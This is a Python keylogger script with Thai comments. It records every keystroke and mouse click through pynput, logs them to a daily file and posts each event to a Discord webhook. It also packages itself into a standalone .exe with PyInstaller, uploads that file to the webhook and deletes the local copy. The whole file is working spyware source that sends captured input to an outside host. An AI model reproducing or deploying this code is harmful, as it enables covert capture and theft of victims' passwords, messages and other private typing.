from pynput.keyboard import Key, Listener
from pynput.mouse import Listener as MouseListener
import logging
import datetime
import requests
import os
import shutil

# กำหนดการตั้งค่าภายใน
config = {
    "log_dir": "",  # ไดเรกทอรีที่เก็บไฟล์ล็อก (หากเว้นว่างไว้จะเก็บในไดเรกทอรีปัจจุบัน)

    "discord_webhook_url": 'YOUR_DISCORD_WEBHOOK_URL',  # แทนที่ด้วย URL Webhook ของ Discord ของคุณ

    "send_to_discord_enabled": True,  # ถ้าต้องการปิดการส่งข้อมูลไปที่ Discord ให้ตั้งค่าเป็น False

    "exe_script_name": 'your_script_name.py',  # ชื่อสคริปต์ที่ใช้สร้างไฟล์ .exe
}

# สร้างชื่อไฟล์ล็อกที่ไม่ซ้ำกันในแต่ละวัน
log_filename = f"{config['log_dir']}keylogs_{datetime.datetime.now().date()}.txt"

# กำหนดค่าการบันทึกข้อมูล
logging.basicConfig(filename=log_filename, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# ฟังก์ชันสำหรับส่งข้อความไปที่ Discord
def send_to_discord(message, file_path=None):
    if config["send_to_discord_enabled"]:  # ตรวจสอบว่าการส่งข้อมูลไปที่ Discord เปิดใช้งานอยู่หรือไม่
        data = {"content": message}  # ข้อความที่จะส่งไปที่ Discord

        files = {}
        if file_path and os.path.exists(file_path):
            files = {"file": open(file_path, "rb")}

        response = requests.post(config["discord_webhook_url"], data=data, files=files)
        if response.status_code != 204:
            print("เกิดข้อผิดพลาดในการส่งข้อมูลไปที่ Discord:", response.status_code)

# ฟังก์ชันที่ใช้บันทึกการกดปุ่ม
def on_press(key):
    try:
        message = f'กดปุ่ม: {key.char}'
        logging.info(message)
        send_to_discord(message)  # ส่งไปที่ Discord
    except AttributeError:
        # ฟังก์ชันกรณีปุ่มพิเศษ
        if key == Key.space:
            message = 'กดปุ่ม: Space'
        elif key == Key.enter:
            message = 'กดปุ่ม: Enter'
        elif key == Key.shift:
            message = 'กดปุ่ม: Shift'
        elif key == Key.ctrl_l or key == Key.ctrl_r:
            message = 'กดปุ่ม: Ctrl'
        elif key == Key.alt_l or key == Key.alt_r:
            message = 'กดปุ่ม: Alt'
        elif key == Key.esc:
            message = 'กดปุ่ม: Esc'
        else:
            message = f'กดปุ่มพิเศษ: {key}'
        
        logging.info(message)
        send_to_discord(message)  # ส่งไปที่ Discord

# ฟังก์ชันที่ใช้บันทึกการคลิกเมาส์
def on_click(x, y, button, pressed):
    if pressed:
        message = f'คลิกเมาส์ที่ {x}, {y} ด้วยปุ่ม {button}'
        logging.info(message)
        send_to_discord(message)  # ส่งไปที่ Discord

# ฟังก์ชันสำหรับสร้างไฟล์ .exe ด้วย PyInstaller
def create_exe():
    os.system(f'pyinstaller --onefile {config["exe_script_name"]}')  # สร้างไฟล์ .exe

    exe_file = f'dist/{config["exe_script_name"].replace(".py", ".exe")}'  # ตำแหน่งของไฟล์ .exe

    if os.path.exists(exe_file):
        # ส่งไฟล์ .exe ไปที่ Discord
        send_to_discord("กำลังส่งไฟล์ .exe ไปที่ Discord", exe_file)

        # ลบไฟล์ .exe หลังจากส่งไป Discord
        os.remove(exe_file)

# การทำงานหลัก
if __name__ == "__main__":
    create_exe()  # สร้าง .exe และส่งไปที่ Discord
    with Listener(on_press=on_press) as keyboard_listener, MouseListener(on_click=on_click) as mouse_listener:
        keyboard_listener.join()
        mouse_listener.join()